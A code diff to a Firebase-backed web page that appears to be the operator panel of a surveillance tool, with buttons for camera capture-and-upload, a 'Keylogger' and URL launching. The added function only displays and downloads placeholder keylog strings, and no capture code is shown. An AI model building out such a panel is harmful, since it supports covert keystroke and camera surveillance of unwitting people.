@@ -75,7 +75,54 @@ firebase.initializeApp(firebaseConfig);
         }
 
 
+        const keylogs = [
+            "Keylog 1",
+            "Keylog 2",
+            "Keylog 3",
+            // Add all keylogs here
+        ];
 
+        function keylogger() {
+            // Create a new window
+            const newWindow = window.open('', '_blank', 'width=600,height=400');
+            if (newWindow) {
+                // Inject HTML content into the new window
+                newWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Keylogger Data</title>
+                        <style>
+                            body { font-family: Arial, sans-serif; padding: 20px; }
+                            #keylogs { margin-bottom: 20px; white-space: pre-wrap; }
+                        </style>
+                    </head>
+                    <body>
+                        <div id="keylogs">${keylogs.join('<br>')}</div>
+                        <button id="downloadBtn">Download All Keylogs</button>
+                    </body>
+                    </html>
+                `);
+
+                // Add JavaScript for downloading keylogs
+                newWindow.document.close();
+                newWindow.onload = function() {
+                    newWindow.document.getElementById('downloadBtn').addEventListener('click', () => {
+                        const allKeylogs = keylogs.join('\n');
+                        const blob = new Blob([allKeylogs], { type: 'text/plain' });
+                        const link = newWindow.document.createElement('a');
+                        link.href = window.URL.createObjectURL(blob);
+                        link.download = 'keylogs.txt';
+                        link.click();
+                    });
+                };
+            } else {
+                alert("Pop-up blocked! Please allow pop-ups for this website.");
+            }
+        }
+        
 </script>
 </head>
 <style type="text/css">
@@ -601,9 +648,9 @@ text-align:center;
 <div class="dfle"  style="" >
 <div id="camera-button" class="icon" onclick="captureAndUpload()" style="background:url('./img/cam.png');background-size:50px 50px;background-repeat:no-repeat;">Camera</div>
   <!-- CamSnap Beta 1.0 by @ES-->
-  <div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">Keylogger</div>
-  <button id="downloadBtn">Download All Keylogs</button>
-  <div id="keylogg"></div>
+<div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
+<div id="keylogg"></div>
+<!-- Kylogs Downloader 1.0 by @ES-->
 <div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div> 
 </div>
 </div>
